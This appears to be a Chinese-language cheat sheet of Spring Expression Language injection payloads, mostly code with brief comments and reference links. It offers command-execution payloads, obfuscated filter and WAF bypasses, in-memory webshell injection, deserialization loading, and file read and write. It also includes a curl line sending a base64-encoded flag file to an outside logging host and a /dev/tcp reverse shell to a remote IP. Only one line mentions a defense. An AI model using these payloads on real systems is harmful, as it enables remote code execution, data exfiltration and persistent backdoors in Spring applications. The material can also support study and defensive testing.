# SPEL

>new关键字大小写可以绕过

## poc

```java
#{…} 用于执行SpEl表达式，并将内容赋值给属性
${…} 主要用于加载外部属性文件中的值

T(Thread).sleep(10000)

T(java.lang.Runtime).getRuntime().exec("calc")
T(Runtime).getRuntime().exec("calc")

// ProcessBuilder
new java.lang.ProcessBuilder({'calc'}).start()
new ProcessBuilder({'calc'}).start()
new java.lang.ProcessBuilder("cmd.exe","/c","calc").start()
${new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()}

''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')
''.class.getSuperclass().class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
''.getClass 替换为 ''.class.getSuperclass().class

//14&15
''.class.getSuperclass().class.forName('java.lang.Runtime').getDeclaredMethods()[14].invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')

bypass sm
T (javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("java.lang.Runtime.getRuntime().exec('calc')")
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")

T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)

T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)

T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)

T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()


T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('rO0AB...'))
// 可以结合CC链食用

//内存木马 回显
T(org.springframework.cglib.core.ReflectUtils).defineClass('Singleton',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADIAtQ....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())

#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}

${''.getClass().forName('java.script.ScriptEngineManager').newInstance().getEngineByName("nashorn").eval(#request.getHeader('User-Agent'))}

echo

JDK 7 及以上版本
JAVA:java.nio.file.Files.readAllLines(java.nio.file.Paths.get("/flag"), java.nio.charset.Charset.defaultCharset())

T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/flag'), T(java.nio.charset.Charset).defaultCharset())

commons-io组件
T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())

使用jdk>=9中的JShell，这种方式会受限于jdk的版本问题
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('').toString()

new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
原理在于Scanner#useDelimiter方法使用指定的字符串分割输出，所以这里给一个乱七八糟的字符串即可，就会让所有的字符都在第一行，然后执行next方法即可获得所有输出

new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()

new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/1.txt"))))

T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/1.txt")), '123464987984949'.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)
```

## bypass

```java
#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"/bin/bash","-c","curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr '\n' '-'`"})}


#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5<>/dev/tcp/1.2.3.4/2333;cat <&5 | while read line; do $line 2>&5 >&5;done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")}

Nuxeo RCE
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898')


jdk9+

T(jdk.jshell.JShell).Methods[6].invoke(null,'').eval('xxxx');
```

字符串绕过

```python
message = input('Enter message to encode:')
 
print('Decoded string (in ASCII):\n')
 
print('T(java.lang.Character).toString(%s)' % ord(message[0]), end="")
for ch in message[1:]:
   print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""), 
print('\n')
 
print('new java.lang.String(new byte[]{', end=""),
print(ord(message[0]), end="")
for ch in message[1:]:
   print(',%s' % ord(ch), end=""), 
print(')}')
```

防御方式是使用`SimpleEvaluationContext`来禁用其敏感的功能，从而阻止表达式注入执行问题的出现。


其他bypass: https://xz.aliyun.com/t/9245

https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/

## springboot回显
```
Java.type("org.springframework.web.context.request.RequestContextHolder").currentRequestAttributes().getResponse().addHeader("test",new java.lang.String(Java.type("sun.misc.IOUtils").readFully(new java.io.FileInputStream("/flag"),1024,false)));
```

## 参考
> https://xz.aliyun.com/t/9245   **可以使用#request.getRequestedSessionId() 或者 #request.getHeader('User-Agent') 反正可以使用request对象或者respose**
>
>https://www.cnblogs.com/bitterz/p/15206255.html
>
>https://landgrey.me/blog/15/
>
>http://rui0.cn/archives/1043
>
>http://rui0.cn/archives/1015
